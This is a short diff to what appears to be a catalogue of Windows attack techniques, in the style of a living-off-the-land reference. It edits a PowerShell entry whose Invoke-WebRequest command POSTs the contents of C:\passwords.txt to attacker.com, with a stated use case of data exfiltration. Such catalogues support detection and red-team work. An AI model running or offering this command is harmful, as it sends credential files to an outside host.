@@ -18,8 +18,8 @@ Commands:
     Privileges: User
     MitreID: T1059.001
     OperatingSystem: Windows 7+, Windows Server 2008 R2+
-  - Command: powershell.exe -c "Invoke-WebRequest -Uri 'http://attacker.com/' -Method POST -Body (Get-Content C:\passwords.txt)"
-    Description: Upload file contents via HTTP POST
+  - Command: powershell.exe -c "Invoke-WebRequest -Uri 'http://attacker.com/' -Method POST -Body ((Get-Content C:\passwords.txt) -join \"`n\")"
+    Description: Upload file contents via HTTP POST with proper formatting
     Usecase: Exfiltrate data to remote server
     Category: Upload
     Privileges: User
